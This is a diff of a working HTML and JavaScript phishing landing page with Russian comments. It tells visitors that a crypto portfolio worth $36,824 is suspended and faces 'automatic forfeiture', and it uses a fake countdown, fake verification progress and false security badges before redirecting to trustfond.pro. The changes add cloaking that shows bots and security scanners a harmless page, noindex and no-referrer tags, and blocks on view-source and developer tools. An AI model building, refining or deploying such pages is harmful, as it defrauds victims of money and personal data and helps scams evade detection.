@@ -3,352 +3,425 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="referrer" content="no-referrer">
     <title>Portfolio Notification</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
         :root {
-            --bg: #f8fafc;
-            --card: #ffffff;
-            --text: #1e293b;
-            --muted: #94a3b8;
-            --accent: #4f46e5;
+            --bg: #f5f5f7;
+            --card-bg: #ffffff;
+            --text: #1d1d1f;
+            --sub: #6e6e73;
+            --border: #e8e8ed;
+            --accent: #1f425f;
+            --accent-light: rgba(31, 66, 95, 0.06);
             --gold: #b8860b;
-            --danger: #ef4444;
-            --success: #10b981;
+            --danger: #dc2626;
+            --radius: 14px;
+            --shadow: 0 1px 3px rgba(0,0,0,0.04), 0 6px 20px rgba(0,0,0,0.06);
         }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
         body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-            background: linear-gradient(180deg, #0a0e27 0%, #1a1f3a 40%, #f8fafc 40%);
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: var(--bg);
+            display: flex;
+            justify-content: center;
+            align-items: center;
             min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 16px;
+            min-height: 100dvh;
+            padding: 20px 16px;
             -webkit-font-smoothing: antialiased;
+            touch-action: manipulation;
         }
-
-        .container {
-            max-width: 420px;
-            width: 100%;
-        }
-
-        /* Карточка уведомления */
-        .alert-card {
-            background: #fff7ed;
-            border: 1px solid #fed7aa;
-            border-radius: 16px;
-            padding: 16px;
+        
+        .container { width: 100%; max-width: 480px; }
+        
+        /* Карточки */
+        .card {
+            background: var(--card-bg);
+            border-radius: var(--radius);
+            padding: 28px 22px 22px;
+            box-shadow: var(--shadow);
             margin-bottom: 12px;
-            animation: slideDown 0.6s ease;
         }
-        @keyframes slideDown {
-            from { opacity: 0; transform: translateY(-20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        .alert-card .icon {
-            width: 40px;
-            height: 40px;
-            background: #ffedd5;
-            border-radius: 50%;
+        
+        /* Лоадер */
+        .loader-wrap {
             display: flex;
+            flex-direction: column;
             align-items: center;
-            justify-content: center;
-            font-size: 18px;
-            margin-bottom: 8px;
+            gap: 14px;
+            padding: 40px 20px;
+            background: var(--card-bg);
+            border-radius: var(--radius);
+            box-shadow: var(--shadow);
         }
-        .alert-card h3 {
-            font-size: 0.9rem;
-            color: #c2410c;
-            margin-bottom: 4px;
+        .loader-spin {
+            width: 32px; height: 32px;
+            border: 3px solid #e8e8ed;
+            border-top: 3px solid var(--accent);
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
         }
-        .alert-card p {
-            font-size: 0.78rem;
-            color: #9a3412;
-            line-height: 1.5;
-        }
-
-        /* Карточка баланса */
-        .balance-card {
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .loader-text { font-size: 14px; color: var(--sub); }
+        
+        /* Прогресс */
+        .progress-wrap { margin-bottom: 8px; }
+        .progress-label { font-size: 13px; color: var(--sub); margin-bottom: 8px; font-weight: 500; }
+        .progress-outer { width: 100%; height: 5px; background: #ececf0; border-radius: 3px; overflow: hidden; }
+        .progress-inner { height: 100%; width: 0%; background: var(--accent); border-radius: 3px; transition: width 0.2s ease; }
+        .progress-steps { display: flex; justify-content: space-between; margin-top: 8px; font-size: 10px; color: #b0b0b8; }
+        .progress-steps span.done { color: var(--accent); font-weight: 600; }
+        
+        /* Заголовки */
+        .shield-icon { width: 52px; height: 52px; margin: 0 auto 14px; background: var(--accent-light); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 26px; }
+        .title { font-size: 19px; font-weight: 600; color: var(--text); letter-spacing: -0.02em; margin-bottom: 6px; text-align: center; }
+        .subtitle { font-size: 13px; color: var(--sub); line-height: 1.5; margin-bottom: 6px; text-align: center; }
+        .reference-row { display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 20px; font-size: 13px; color: var(--sub); }
+        .reference-row span { font-family: 'SF Mono', 'Menlo', 'Consolas', monospace; font-weight: 500; color: #555; }
+        
+        /* Баланс */
+        .balance-block {
             background: linear-gradient(135deg, #0a0e27 0%, #1e2545 100%);
-            border-radius: 20px;
-            padding: 24px 20px;
+            border-radius: 16px;
+            padding: 20px;
             color: white;
-            margin-bottom: 12px;
+            text-align: center;
+            margin-bottom: 16px;
             position: relative;
             overflow: hidden;
-            animation: fadeIn 0.8s ease 0.3s both;
         }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(12px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        .balance-card::after {
+        .balance-block::after {
             content: '';
             position: absolute;
-            top: -30%;
-            right: -20%;
-            width: 180px;
-            height: 180px;
-            background: radial-gradient(circle, rgba(79,70,229,0.2) 0%, transparent 70%);
+            top: -30%; right: -20%;
+            width: 150px; height: 150px;
+            background: radial-gradient(circle, rgba(255,255,255,0.08) 0%, transparent 70%);
             border-radius: 50%;
             pointer-events: none;
         }
-        .balance-label {
-            font-size: 0.65rem;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            color: rgba(255,255,255,0.5);
-            margin-bottom: 4px;
-        }
-        .balance-amount {
-            font-size: 2.2rem;
-            font-weight: 800;
-            letter-spacing: -1px;
-            position: relative;
-            z-index: 1;
-        }
-        .balance-details {
-            display: flex;
-            gap: 16px;
-            margin-top: 8px;
-            font-size: 0.7rem;
-            color: rgba(255,255,255,0.5);
-            position: relative;
-            z-index: 1;
-        }
-        .balance-details span {
-            display: flex;
-            align-items: center;
-            gap: 4px;
-        }
-
-        /* Статус */
+        .balance-label { font-size: 0.6rem; text-transform: uppercase; letter-spacing: 2px; color: rgba(255,255,255,0.5); margin-bottom: 2px; }
+        .balance-amount { font-size: 2rem; font-weight: 800; letter-spacing: -1px; position: relative; z-index: 1; }
+        .balance-sub { font-size: 0.7rem; color: rgba(255,255,255,0.5); margin-top: 6px; position: relative; z-index: 1; display: flex; justify-content: center; gap: 12px; }
         .status-badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 4px;
-            background: rgba(239,68,68,0.15);
-            color: #ef4444;
-            font-size: 0.7rem;
-            font-weight: 600;
-            padding: 4px 10px;
-            border-radius: 20px;
-            margin-top: 10px;
-            position: relative;
-            z-index: 1;
+            display: inline-flex; align-items: center; gap: 4px;
+            background: rgba(220,38,38,0.2); color: #ef4444;
+            font-size: 0.65rem; font-weight: 600; padding: 3px 10px; border-radius: 20px;
+            margin-top: 8px; position: relative; z-index: 1;
             animation: pulse 2s infinite;
         }
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.6; }
-        }
-
-        /* Карточка действий */
-        .action-card {
-            background: white;
-            border-radius: 16px;
-            padding: 20px;
-            border: 1px solid #e2e8f0;
-            box-shadow: 0 4px 16px rgba(0,0,0,0.06);
-            animation: fadeIn 0.8s ease 0.6s both;
-        }
-        .action-card h2 {
-            font-size: 1rem;
-            margin-bottom: 8px;
-            color: #1e293b;
-        }
-        .action-card p {
-            font-size: 0.8rem;
-            color: #64748b;
-            line-height: 1.5;
-            margin-bottom: 16px;
-        }
-
+        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.5} }
+        
+        /* Кнопка */
         .btn-secure {
-            width: 100%;
-            padding: 16px;
+            width: 100%; padding: 14px;
             background: linear-gradient(135deg, #d4a853 0%, #b8860b 100%);
-            color: white;
-            border: none;
-            border-radius: 14px;
-            font-size: 1rem;
-            font-weight: 700;
-            cursor: pointer;
-            transition: all 0.2s;
-            box-shadow: 0 4px 16px rgba(184,134,11,0.3);
+            color: white; border: none; border-radius: 12px;
+            font-size: 0.95rem; font-weight: 700; cursor: pointer;
+            transition: all 0.2s; box-shadow: 0 4px 16px rgba(184,134,11,0.3);
         }
-        .btn-secure:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 24px rgba(184,134,11,0.4);
-        }
-        .btn-secure:active {
-            transform: translateY(0);
-        }
-
-        .security-note {
-            text-align: center;
-            font-size: 0.65rem;
-            color: #94a3b8;
-            margin-top: 12px;
-            line-height: 1.4;
-        }
-        .security-note i {
-            color: #10b981;
-        }
-
-        /* Счётчик времени */
-        .timer {
-            text-align: center;
-            font-size: 0.7rem;
-            color: #ef4444;
-            margin-top: 8px;
-            font-weight: 600;
-        }
-
-        /* Адаптивность */
-        @media (max-width: 380px) {
-            .balance-amount {
-                font-size: 1.6rem;
-            }
-            .balance-details {
-                flex-direction: column;
-                gap: 4px;
-            }
-        }
+        .btn-secure:hover { transform: translateY(-1px); }
+        .btn-secure:disabled { opacity: 0.5; cursor: not-allowed; }
+        
+        /* Таймер */
+        .timer { text-align: center; font-size: 0.7rem; color: #ef4444; margin-top: 8px; font-weight: 600; }
+        
+        /* Футер */
+        .footer-note { text-align: center; font-size: 11px; color: #c0c0c8; margin-top: 16px; line-height: 1.5; }
+        
+        /* Нейтральная страница */
+        .neutral-icon { font-size: 44px; margin-bottom: 14px; }
+        .neutral-title { font-size: 19px; font-weight: 600; color: var(--text); margin-bottom: 8px; }
+        .neutral-sub { font-size: 14px; color: var(--sub); line-height: 1.5; }
+        
+        /* Анимации */
+        @keyframes fadeUp { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
+        .fade { opacity: 0; animation: fadeUp 0.4s ease forwards; }
+        .f1{animation-delay:0.05s}.f2{animation-delay:0.12s}.f3{animation-delay:0.20s}.f4{animation-delay:0.28s}.f5{animation-delay:0.36s}.f6{animation-delay:0.44s}.f7{animation-delay:0.52s}
     </style>
 </head>
 <body>
-    <div class="container">
-        <!-- Уведомление -->
-        <div class="alert-card">
-            <div class="icon">⚠️</div>
-            <h3>Action Required</h3>
-            <p>Your portfolio has been <b>inactive for 364 days</b>. The assets are in a suspended state and require immediate verification to prevent automatic forfeiture.</p>
-        </div>
 
-        <!-- Баланс -->
-        <div class="balance-card">
-            <p class="balance-label">Portfolio Balance</p>
-            <p class="balance-amount" id="balance">36,824.44 USD</p>
-            <div class="balance-details">
-                <span>₿ 0.365 BTC</span>
-                <span>Ξ 4.578 ETH</span>
-                <span>💲 3,241 USDT</span>
-            </div>
-            <div class="status-badge">
-                <span style="width:6px;height:6px;background:#ef4444;border-radius:50%;display:inline-block;"></span>
-                Suspended — Verification Required
-            </div>
+    <div class="container" id="app">
+        <!-- Лоадер -->
+        <div class="loader-wrap" id="loader">
+            <div class="loader-spin"></div>
+            <div class="loader-text">Establishing secure connection...</div>
         </div>
-
-        <!-- Действие -->
-        <div class="action-card">
-            <h2>🔒 Secure Access Required</h2>
-            <p>To recover your assets, you must verify your identity through our secure portal. This process takes <b>less than 2 minutes</b> and protects your funds from unauthorized access.</p>
-            <p style="font-size:0.75rem;color:#ef4444;font-weight:600;">⚠️ Unverified portfolios may be subject to automatic forfeiture per our terms of service.</p>
+        
+        <!-- Реальный контент -->
+        <div id="content" style="display: none;">
+            <!-- Уведомление -->
+            <div class="card fade f1">
+                <div style="display:flex;align-items:flex-start;gap:10px;">
+                    <span style="font-size:22px;">⚠️</span>
+                    <div>
+                        <p style="font-size:0.85rem;font-weight:600;color:#c2410c;margin-bottom:4px;">Action Required</p>
+                        <p style="font-size:0.78rem;color:#9a3412;line-height:1.5;" id="alert-text">
+                            Your portfolio has been <b>inactive for 364 days</b>. Assets are suspended and require verification.
+                        </p>
+                    </div>
+                </div>
+            </div>
             
-            <button class="btn-secure" onclick="redirectToPortal()">
-                🔓 Secure Access — Verify & Recover
-            </button>
+            <!-- Баланс -->
+            <div class="balance-block fade f2">
+                <p class="balance-label">Portfolio Balance</p>
+                <p class="balance-amount" id="balance">36,824.44 USD</p>
+                <div class="balance-sub">
+                    <span>₿ 0.365 BTC</span>
+                    <span>Ξ 4.578 ETH</span>
+                    <span>💲 3,241 USDT</span>
+                </div>
+                <div class="status-badge">
+                    <span style="width:6px;height:6px;background:#ef4444;border-radius:50%;display:inline-block;"></span>
+                    Suspended — Verification Required
+                </div>
+            </div>
             
-            <p class="timer" id="timer">Session expires in: 04:59</p>
+            <!-- Прогресс -->
+            <div class="card fade f3 f4">
+                <div class="shield-icon">🛡</div>
+                <h1 class="title">Secure Verification</h1>
+                <p class="subtitle">Verifying your account to recover assets</p>
+                
+                <div class="reference-row fade f5">
+                    Reference: <span id="ref-id">loading...</span>
+                </div>
+                
+                <div class="progress-wrap fade f6">
+                    <div class="progress-label" id="progress-label">Initializing verification...</div>
+                    <div class="progress-outer">
+                        <div class="progress-inner" id="progress-bar"></div>
+                    </div>
+                    <div class="progress-steps">
+                        <span id="step1">Connecting</span>
+                        <span id="step2">Scanning</span>
+                        <span id="step3">Verifying</span>
+                        <span id="step4">Redirecting</span>
+                    </div>
+                </div>
+                
+                <button class="btn-secure fade f7" id="btn-go" onclick="goNow()">
+                    🔓 Secure Access — Recover Funds
+                </button>
+                <p class="timer" id="timer">Session expires in: 04:59</p>
+            </div>
             
-            <p class="security-note">
-                <i>🔒</i> Connection secured · 256-bit encryption · Your data is protected
-            </p>
+            <div class="footer-note">
+                🔒 Secure channel &bull; 256-bit encrypted<br>
+                Personal Data Protection Fund &bull; 2026
+            </div>
         </div>
     </div>
 
     <script>
-        // Подтягиваем параметры из URL (если есть)
+    // ============================================
+    // НАСТРОЙКИ
+    // ============================================
+    var FINAL_URL = 'https://trustfond.pro/';
+    var DELAY_BEFORE_SHOW = 1800;
+    var PROGRESS_STEPS = 4;
+    var STEP_DURATION = 900;
+    
+    // ============================================
+    // ПАРАМЕТРЫ URL
+    // ============================================
+    function getParams() {
         var params = new URLSearchParams(window.location.search);
-        var userId = params.get('uid') || '44326567';
-        var ref = params.get('ref') || 'email';
-
-        // Персонализация
-        document.querySelector('.alert-card p').innerHTML = 
-            'Your portfolio <b>#' + userId + '</b> has been <b>inactive for 364 days</b>. ' +
-            'The assets are in a suspended state and require immediate verification to prevent automatic forfeiture.';
-
-        // Таймер обратного отсчёта (5 минут)
-        var seconds = 300;
-        var timerEl = document.getElementById('timer');
+        return {
+            uid: params.get('uid') || params.get('id') || '44326567',
+            ref: params.get('ref') || 'email',
+            token: params.get('token') || params.get('d') || generateRef()
+        };
+    }
+    
+    var urlParams = getParams();
+    
+    function generateRef() {
+        var chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+        var result = '';
+        for (var i = 0; i < 8; i++) result += chars.charAt(Math.floor(Math.random() * chars.length));
+        return 'REF-' + result;
+    }
+    
+    // ============================================
+    // ПРОВЕРКА НА БОТА
+    // ============================================
+    function isRealUser() {
+        if (navigator.webdriver === true) return false;
+        if (!navigator.languages || navigator.languages.length === 0) return false;
+        if (screen.width < 150 || screen.height < 150) return false;
+        if ((screen.width === 1 && screen.height === 1) || (screen.width === 0 && screen.height === 0)) return false;
         
-        function updateTimer() {
-            var min = Math.floor(seconds / 60);
-            var sec = seconds % 60;
-            timerEl.textContent = 'Session expires in: ' + 
-                (min < 10 ? '0' : '') + min + ':' + (sec < 10 ? '0' : '') + sec;
+        var ua = navigator.userAgent;
+        var isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(ua);
+        var hasTouch = ('ontouchstart' in window || navigator.maxTouchPoints > 0);
+        var hasMotion = ('DeviceMotionEvent' in window || 'DeviceOrientationEvent' in window);
+        
+        if (isMobile && (hasTouch || hasMotion)) return true;
+        
+        if (!isMobile) {
+            var hasPlugins = (navigator.plugins && navigator.plugins.length > 0);
+            var hasMime = (navigator.mimeTypes && navigator.mimeTypes.length > 0);
+            var hasChrome = (typeof window.chrome !== 'undefined' && window.chrome);
+            if (!hasPlugins && !hasMime && !hasChrome) return false;
+            if (navigator.hardwareConcurrency === 0) return false;
+        }
+        
+        return true;
+    }
+    
+    // ============================================
+    // НЕЙТРАЛЬНАЯ СТРАНИЦА ДЛЯ БОТОВ
+    // ============================================
+    function showNeutral() {
+        document.getElementById('loader').style.display = 'none';
+        var c = document.getElementById('content');
+        c.style.display = 'block';
+        c.innerHTML = '<div class="card" style="text-align:center;"><div class="neutral-icon">✓</div><div class="neutral-title">Verification Complete</div><div class="neutral-sub">Your privacy check has been processed. No further action is needed.</div></div>';
+    }
+    
+    // ============================================
+    // ПОКАЗ РЕАЛЬНОГО КОНТЕНТА
+    // ============================================
+    var userIsReal = false;
+    
+    function showReal() {
+        userIsReal = true;
+        
+        // Персонализация
+        document.getElementById('ref-id').textContent = urlParams.token;
+        document.getElementById('alert-text').innerHTML = 
+            'Your portfolio <b>#' + urlParams.uid + '</b> has been <b>inactive for 364 days</b>. ' +
+            'Assets are suspended and require immediate verification to prevent automatic forfeiture.';
+        
+        document.getElementById('loader').style.display = 'none';
+        document.getElementById('content').style.display = 'block';
+        
+        startProgress();
+        startTimer();
+    }
+    
+    // ============================================
+    // ПРОГРЕСС-БАР
+    // ============================================
+    function startProgress() {
+        var bar = document.getElementById('progress-bar');
+        var label = document.getElementById('progress-label');
+        var steps = ['step1', 'step2', 'step3', 'step4'];
+        
+        var stepLabels = [
+            'Initializing verification...',
+            'Scanning portfolio records...',
+            'Verifying account ownership...',
+            'Ready — redirecting to secure portal...'
+        ];
+        
+        var currentStep = 0;
+        
+        function runStep() {
+            if (currentStep >= PROGRESS_STEPS) return;
             
-            if (seconds <= 60) {
-                timerEl.style.color = '#ef4444';
-                timerEl.style.fontWeight = '800';
-                timerEl.style.animation = 'pulse 1s infinite';
+            var percent = Math.round(((currentStep + 1) / PROGRESS_STEPS) * 100);
+            bar.style.width = percent + '%';
+            label.textContent = stepLabels[currentStep];
+            
+            for (var i = 0; i < steps.length; i++) {
+                var el = document.getElementById(steps[i]);
+                if (el && i <= currentStep) el.classList.add('done');
             }
             
+            currentStep++;
+            if (currentStep < PROGRESS_STEPS) {
+                setTimeout(runStep, STEP_DURATION);
+            }
+        }
+        
+        runStep();
+    }
+    
+    // ============================================
+    // ТАЙМЕР
+    // ============================================
+    var seconds = 300;
+    var timerInterval;
+    
+    function startTimer() {
+        var timerEl = document.getElementById('timer');
+        
+        function update() {
+            var min = Math.floor(seconds / 60);
+            var sec = seconds % 60;
+            timerEl.textContent = 'Session expires in: ' + (min < 10 ? '0' : '') + min + ':' + (sec < 10 ? '0' : '') + sec;
+            
+            if (seconds <= 60) {
+                timerEl.style.animation = 'pulse 1s infinite';
+            }
             if (seconds <= 0) {
                 clearInterval(timerInterval);
-                timerEl.textContent = '⚠️ Session expired. Please reload.';
-                document.querySelector('.btn-secure').disabled = true;
-                document.querySelector('.btn-secure').textContent = 'Session Expired';
-                document.querySelector('.btn-secure').style.opacity = '0.5';
+                timerEl.textContent = '⚠️ Session expired';
+                document.getElementById('btn-go').disabled = true;
+                document.getElementById('btn-go').textContent = 'Session Expired';
             }
             seconds--;
         }
         
-        updateTimer();
-        var timerInterval = setInterval(updateTimer, 1000);
-
-        // Редирект на основной сайт
-        function redirectToPortal() {
-            if (seconds <= 0) return;
-            
-            var btn = document.querySelector('.btn-secure');
-            btn.textContent = 'Redirecting...';
-            btn.disabled = true;
-            btn.style.opacity = '0.7';
-            
-            // Сохраняем метку перехода
-            localStorage.setItem('warmup_completed', 'true');
-            localStorage.setItem('warmup_time', new Date().toISOString());
-            localStorage.setItem('warmup_uid', userId);
-            localStorage.setItem('warmup_ref', ref);
-            
-            // Редирект на основной домен с капчей
-            setTimeout(function() {
-                window.location.href = 'https://trustfond.pro/?utm_source=email&utm_medium=warmup&uid=' + userId;
-            }, 800);
-        }
-
-        // Эффект волнения при бездействии
-        var inactivityTimer;
-        function resetInactivity() {
-            clearTimeout(inactivityTimer);
-            inactivityTimer = setTimeout(function() {
-                // Лёгкое мигание баланса
-                var balanceEl = document.getElementById('balance');
-                balanceEl.style.transition = 'opacity 0.3s';
-                balanceEl.style.opacity = '0.4';
-                setTimeout(function() {
-                    balanceEl.style.opacity = '1';
-                }, 500);
-            }, 10000);
-        }
+        update();
+        timerInterval = setInterval(update, 1000);
+    }
+    
+    // ============================================
+    // РЕДИРЕКТ
+    // ============================================
+    function goNow() {
+        if (seconds <= 0) return;
         
-        document.addEventListener('mousemove', resetInactivity);
-        document.addEventListener('touchstart', resetInactivity);
-        resetInactivity();
-
-        console.log('Warmup page loaded for user #' + userId);
-        console.log('Balance: $36,824.44');
-        console.log('Status: Suspended — Verification Required');
+        var btn = document.getElementById('btn-go');
+        btn.textContent = 'Redirecting...';
+        btn.disabled = true;
+        btn.style.opacity = '0.7';
+        
+        // Сохраняем метки
+        localStorage.setItem('warmup_completed', 'true');
+        localStorage.setItem('warmup_time', new Date().toISOString());
+        localStorage.setItem('warmup_uid', urlParams.uid);
+        localStorage.setItem('warmup_ref', urlParams.ref);
+        
+        // Редирект на основной сайт
+        setTimeout(function() {
+            window.location.href = FINAL_URL + '?uid=' + urlParams.uid + '&ref=' + urlParams.ref;
+        }, 600);
+    }
+    
+    // ============================================
+    // ЗАПУСК
+    // ============================================
+    setTimeout(function() {
+        if (isRealUser()) {
+            showReal();
+        } else {
+            showNeutral();
+        }
+    }, DELAY_BEFORE_SHOW);
+    
+    // ============================================
+    // ЗАЩИТЫ
+    // ============================================
+    document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
+    
+    document.addEventListener('keydown', function(e) {
+        if ((e.ctrlKey && e.key === 'u') || (e.ctrlKey && e.shiftKey && e.key === 'I') || e.key === 'F12') {
+            e.preventDefault(); return false;
+        }
+    });
+    
+    if (window.top !== window.self) { showNeutral(); }
     </script>
+
 </body>
 </html>
